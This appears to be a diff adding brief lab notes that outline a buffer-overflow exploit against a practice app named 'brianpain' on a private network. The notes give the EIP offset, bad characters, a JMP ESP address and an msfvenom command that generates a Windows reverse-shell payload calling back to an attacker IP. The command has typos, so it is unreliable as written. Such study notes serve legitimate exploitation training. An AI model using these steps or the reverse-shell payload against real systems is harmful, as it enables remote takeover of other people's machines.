@@ -1,0 +1,19 @@
+App brianpain
+IP 192.168.0.134
+port 9999
+
+
+
+1. fuzzing remoter server "A" *700
+
+2. Send pattern adn find EIP 35724134
+
+3. finding offsert 524
+
+4. Finding bad-char "\x00"
+
+5. generating shellcode (msfvenom -p Windows/shell_reverse_tcp LHOS=1192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\")
+
+6. find JMP ESP "\xff\xe4"  "\xf3\x12\x17\x31"
+
+7. Sending final exploit
